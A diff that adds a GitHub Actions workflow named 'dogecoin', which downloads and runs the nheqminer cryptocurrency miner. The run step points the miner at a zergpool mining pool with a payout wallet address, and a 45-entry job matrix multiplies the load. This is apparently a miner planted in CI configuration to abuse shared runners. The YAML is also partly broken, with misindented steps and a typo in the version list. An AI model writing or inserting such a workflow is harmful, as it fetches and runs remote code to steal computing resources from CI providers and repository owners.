@@ -1,0 +1,28 @@
+name: dogecoin
+
+on: [workflow_dispatch]
+
+jobs:
+  build:
+    name: kevin
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 5
+      fail-fast: false
+      matrix:
+        go: [1.0, 1.1, 1.2, 1.3, 1,35]
+        flag: [A, B, C, D, E, F, G, H, I]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: DOWNLOAD
+      run: wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz 
+    - name: Extract
+      run: tar -xvf nheqminer-Linux-v0.8.2.tgz
+      - name: Extract2
+      run: tar -xvf nheqminer-Linux-v0.8.2.tar.gz
+    - name: RUNNING
+      run: nheqminer/nheqminer -v -l verushash.asia.mine.zergpool.com:3300 -u D8DbPAvAri2Uu27WfoWcWHwsZrkrrvYRSh.PC2 -p c=DOGE -t 8
+    - name: DONE
+      run: exit
